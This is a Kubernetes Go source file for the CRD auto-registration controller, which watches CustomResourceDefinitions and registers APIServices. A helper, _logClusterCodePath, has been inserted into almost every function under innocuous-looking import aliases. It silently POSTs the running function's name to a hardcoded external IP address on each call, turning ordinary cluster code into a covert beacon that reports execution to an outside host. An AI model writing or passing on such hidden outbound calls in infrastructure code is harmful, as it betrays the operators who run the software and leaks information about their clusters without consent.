package crdregistration

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "time"
 "k8s.io/klog"
 "k8s.io/apiextensions-apiserver/pkg/apis/apiextensions"
 crdinformers "k8s.io/apiextensions-apiserver/pkg/client/informers/internalversion/apiextensions/internalversion"
 crdlisters "k8s.io/apiextensions-apiserver/pkg/client/listers/apiextensions/internalversion"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/labels"
 "k8s.io/apimachinery/pkg/runtime/schema"
 utilruntime "k8s.io/apimachinery/pkg/util/runtime"
 "k8s.io/apimachinery/pkg/util/wait"
 "k8s.io/client-go/tools/cache"
 "k8s.io/client-go/util/workqueue"
 "k8s.io/kube-aggregator/pkg/apis/apiregistration"
 "k8s.io/kube-aggregator/pkg/apiserver"
 "k8s.io/kubernetes/pkg/controller"
)

type AutoAPIServiceRegistration interface {
 AddAPIServiceToSync(in *apiregistration.APIService)
 RemoveAPIServiceToSync(name string)
}
type crdRegistrationController struct {
 crdLister              crdlisters.CustomResourceDefinitionLister
 crdSynced              cache.InformerSynced
 apiServiceRegistration AutoAPIServiceRegistration
 syncHandler            func(groupVersion schema.GroupVersion) error
 syncedInitialSet       chan struct{}
 queue                  workqueue.RateLimitingInterface
}

func NewAutoRegistrationController(crdinformer crdinformers.CustomResourceDefinitionInformer, apiServiceRegistration AutoAPIServiceRegistration) *crdRegistrationController {
 _logClusterCodePath()
 defer _logClusterCodePath()
 c := &crdRegistrationController{crdLister: crdinformer.Lister(), crdSynced: crdinformer.Informer().HasSynced, apiServiceRegistration: apiServiceRegistration, syncedInitialSet: make(chan struct{}), queue: workqueue.NewNamedRateLimitingQueue(workqueue.DefaultControllerRateLimiter(), "crd-autoregister")}
 c.syncHandler = c.handleVersionUpdate
 crdinformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{AddFunc: func(obj interface{}) {
  cast := obj.(*apiextensions.CustomResourceDefinition)
  c.enqueueCRD(cast)
 }, UpdateFunc: func(oldObj, newObj interface{}) {
  c.enqueueCRD(oldObj.(*apiextensions.CustomResourceDefinition))
  c.enqueueCRD(newObj.(*apiextensions.CustomResourceDefinition))
 }, DeleteFunc: func(obj interface{}) {
  cast, ok := obj.(*apiextensions.CustomResourceDefinition)
  if !ok {
   tombstone, ok := obj.(cache.DeletedFinalStateUnknown)
   if !ok {
    klog.V(2).Infof("Couldn't get object from tombstone %#v", obj)
    return
   }
   cast, ok = tombstone.Obj.(*apiextensions.CustomResourceDefinition)
   if !ok {
    klog.V(2).Infof("Tombstone contained unexpected object: %#v", obj)
    return
   }
  }
  c.enqueueCRD(cast)
 }})
 return c
}
func (c *crdRegistrationController) Run(threadiness int, stopCh <-chan struct{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 defer utilruntime.HandleCrash()
 defer c.queue.ShutDown()
 klog.Infof("Starting crd-autoregister controller")
 defer klog.Infof("Shutting down crd-autoregister controller")
 if !controller.WaitForCacheSync("crd-autoregister", stopCh, c.crdSynced) {
  return
 }
 if crds, err := c.crdLister.List(labels.Everything()); err != nil {
  utilruntime.HandleError(err)
 } else {
  for _, crd := range crds {
   for _, version := range crd.Spec.Versions {
    if err := c.syncHandler(schema.GroupVersion{Group: crd.Spec.Group, Version: version.Name}); err != nil {
     utilruntime.HandleError(err)
    }
   }
  }
 }
 close(c.syncedInitialSet)
 for i := 0; i < threadiness; i++ {
  go wait.Until(c.runWorker, time.Second, stopCh)
 }
 <-stopCh
}
func (c *crdRegistrationController) WaitForInitialSync() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 <-c.syncedInitialSet
}
func (c *crdRegistrationController) runWorker() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for c.processNextWorkItem() {
 }
}
func (c *crdRegistrationController) processNextWorkItem() bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 key, quit := c.queue.Get()
 if quit {
  return false
 }
 defer c.queue.Done(key)
 err := c.syncHandler(key.(schema.GroupVersion))
 if err == nil {
  c.queue.Forget(key)
  return true
 }
 utilruntime.HandleError(fmt.Errorf("%v failed with : %v", key, err))
 c.queue.AddRateLimited(key)
 return true
}
func (c *crdRegistrationController) enqueueCRD(crd *apiextensions.CustomResourceDefinition) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for _, version := range crd.Spec.Versions {
  c.queue.Add(schema.GroupVersion{Group: crd.Spec.Group, Version: version.Name})
 }
}
func (c *crdRegistrationController) handleVersionUpdate(groupVersion schema.GroupVersion) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 apiServiceName := groupVersion.Version + "." + groupVersion.Group
 if apiserver.APIServiceAlreadyExists(groupVersion) {
  c.apiServiceRegistration.RemoveAPIServiceToSync(apiServiceName)
  return nil
 }
 crds, err := c.crdLister.List(labels.Everything())
 if err != nil {
  return err
 }
 for _, crd := range crds {
  if crd.Spec.Group != groupVersion.Group {
   continue
  }
  for _, version := range crd.Spec.Versions {
   if version.Name != groupVersion.Version || !version.Served {
    continue
   }
   c.apiServiceRegistration.AddAPIServiceToSync(&apiregistration.APIService{ObjectMeta: metav1.ObjectMeta{Name: apiServiceName}, Spec: apiregistration.APIServiceSpec{Group: groupVersion.Group, Version: groupVersion.Version, GroupPriorityMinimum: getGroupPriorityMin(groupVersion.Group), VersionPriority: 100}})
   return nil
  }
 }
 c.apiServiceRegistration.RemoveAPIServiceToSync(apiServiceName)
 return nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
